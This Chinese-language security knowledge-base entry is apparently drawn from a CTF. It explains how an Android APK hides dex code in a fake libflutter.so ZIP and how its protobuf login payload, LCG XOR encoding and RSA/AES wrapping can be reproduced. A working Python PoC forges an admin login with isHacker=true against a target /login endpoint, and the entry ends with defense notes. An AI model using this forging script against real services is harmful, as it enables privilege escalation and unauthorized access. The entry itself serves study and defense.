---
id: mobile-android-apk-hidden-dex-protobuf-login-forge
title: APK 伪装 so 藏 dex：protobuf 登录伪造 + LCG XOR/RSA-AES 封装
type: scenario
domain: mobile
path: mobile/android
technique: apk-hidden-dex-protobuf-login-forge
tags:
- mobile
- android
- apk
- dex
- protobuf
- rsa
- aes
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:14:13+08:00'
  notes: 已对照原文与图14核对：libflutter.so 实为 ZIP 内含 classes*.dex、com.example.titlele/LogInfo、protobuf field1 user/field2 isHacker（0A/10）、LCG XOR 流 622918/1664525/1013904223、Base64 inner login、RSA PKCS1v15 封装随机 AES key + AES-CBC(IV=0,PKCS7) 的 a1/b2 JSON 均一致。未验证点：原文 exp 未展示服务端返回 flag，admin+isHacker=true 越权结果为推断；PoC 未复跑；原文无版本信息；frontmatter 无 sources/source_url。
url: /docs/mobile/android/mobile-android-apk-hidden-dex-protobuf-login-forge/
draft: false
kb_aliases:
- 伪装 so 藏 dex
- libflutter.so 隐藏 dex
- protobuf 登录伪造
- isHacker 字段
- LCG XOR 流
- RSA + AES 封装
- MixTielele
---

## 一句话结论

APK 的 Java 层只是外壳，真正的登录逻辑藏在伪装成 `libflutter.so` 的 ZIP（内含隐藏 `classes*.dex`）；隐藏 dex 用 protobuf 构造 `LoginInfo`（`user`、`isHacker`），经固定种子 LCG XOR 流 + Base64 得到 inner login，再由 native 层用攻击者可控的 AES key 加密、RSA 加密该 AES key 后 POST；把 `user=admin`、`isHacker=true` 即可伪造管理员登录拿到 flag。

## 原理

- Java 层 Activity 调用 native `EncTitlele`，`System.loadLibrary("mixtitlele")`；同时 `OO00OO0OO0000OOOOO.load(this)` 加载隐藏逻辑。
- `libflutter.so` 不是真正常规 so，而是 ZIP 容器，内含 `classes.dex`、`classes2.dex` 等隐藏 dex；用 JADX 打开可看到 `com.example.titlele` 与 `com.example.utils.Encrypt`。
- 隐藏 dex 的 `LogInfo` 构造 `UserProto.LoginInfo`：field 1 `user`（string）、field 2 `isHacker`（bool）；`Encrypt.enc` 用 LCG XOR 流加密：`v=622918; out[i]=data[i]^(v&0xff); v=(1664525*v+1013904223)&0xffffffff`；再 Base64 得到 inner login。
- 外层 `EncTitlele`：随机 16 字节 AES key；用服务端 RSA 公钥 PKCS#1 v1.5 加密 AES key → `a1`；用 AES-CBC（IV=0，PKCS7）加密 inner login → `b2`；JSON `{"a1":"...","b2":"..."}` POST 到 `/login`。
- 服务端用私钥解 `a1` 得到攻击者的 AES key，解 `b2` 得到 inner login，再解 protobuf；由于 `isHacker` 来自客户端且未做服务端校验，构造 `admin + true` 即可越权。
- 关键点：隐藏 dex 不是加密，只是容器伪装；LCG XOR 可逆；RSA 公钥是公开的，攻击者可以自己选 AES key 并让服务端加密给它。

## 触发条件

- APK 中存在伪装成 `.so` 的 ZIP/压缩包，或 `libflutter.so` 大小/格式异常。
- Java 层存在 native 方法 + 隐藏 dex/动态加载。
- 登录数据是 protobuf/JSON，包含 `user`、`isHacker`、`role` 等客户端可控字段。
- 外层使用 RSA 公钥封装随机 AES key，AES 加密内层数据。

## 利用步骤

1. 解包 APK，检查 `lib/arm64-v8a/libflutter.so` 等文件；用 `file`/`binwalk` 确认是否为 ZIP。
2. 解压隐藏 dex，用 JADX 反编译，定位 `LoginInfo`/`Encrypt`/`LogInfo`。
3. 还原 protobuf 字段编号与类型；构造 `user=admin`、`isHacker=true` 的字节串。
4. 复现 LCG XOR 流，加密 protobuf，Base64 得到 inner login。
5. 生成随机 AES key，RSA-PKCS1v15 加密得到 `a1`；AES-CBC(IV=0, PKCS7) 加密 inner login 得到 `b2`。
6. POST `{"a1","b2"}` 到登录接口，读取响应中的 flag。

## PoC

```python
import os, json, base64, requests
from cryptography.hazmat.primitives import serialization, padding
from cryptography.hazmat.primitives.asymmetric import padding as asympadding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

PUB = b"""-----BEGIN PUBLIC KEY-----
...服务端 RSA 公钥...
-----END PUBLIC KEY-----"""

def xor_enc(data: bytes) -> bytes:
    v = 622918
    out = bytearray()
    for b in data:
        out.append(b ^ (v & 0xFF))
        v = (1664525 * v + 1013904223) & 0xFFFFFFFF
    return bytes(out)

def build_inner(user: str, is_hacker: bool) -> str:
    u = user.encode()
    proto = bytes([0x0A, len(u)]) + u + bytes([0x10, 0x01 if is_hacker else 0x00])
    return base64.b64encode(xor_enc(proto)).decode()

def enc_titlele(inner: str) -> str:
    pub = serialization.load_pem_public_key(PUB)
    aes_key = os.urandom(16)
    a1 = base64.b64encode(pub.encrypt(aes_key, asympadding.PKCS1v15())).decode()
    padder = padding.PKCS7(128).padder()
    padded = padder.update(inner.encode()) + padder.finalize()
    enc = Cipher(algorithms.AES(aes_key), modes.CBC(b"\x00" * 16)).encryptor()
    b2 = base64.b64encode(enc.update(padded) + enc.finalize()).decode()
    return json.dumps({"a1": a1, "b2": b2})

body = enc_titlele(build_inner("admin", True))
print(requests.post("http://<target>/login", data=body,
                    headers={"Content-Type": "application/json"}, timeout=10).text)
```

## 变体与关联

- 变体：隐藏 dex 放在 `assets/`、资源文件、加密 ZIP、伪造的 `.so`/图片中。
- 变体：内层编码换成 JSON/MessagePack/自定义二进制；字段名不同但客户端可控。
- 变体：外层 RSA+AES 换成固定 AES key、硬编码 IV、无 RSA 封装。
- 关联：[[ctf-reverse-apk-signature-sha1-xor-key-hidden-flag]]（APK 隐藏 key）、[[ctf-reverse-apk-rc6-base58-dex-db-derive]]（APK 多层解码）、[[crypto-protocol-public-key-substitution-unbound-cert]]（公钥替换）。

## 检测与防御

- 防御：服务端必须校验 `isHacker`/`role` 等授权字段，不能信任客户端；对登录请求做签名/完整性保护。
- 防御：APK 完整性校验、隐藏 dex 检测、native 层加固；不要把敏感逻辑只放在客户端。
- 检测：APK 中出现伪装 so/ZIP、动态加载 dex、protobuf 登录字段、客户端可控的权限字段。
- 响应：确认越权后修复服务端授权，轮换密钥，审计历史登录记录。
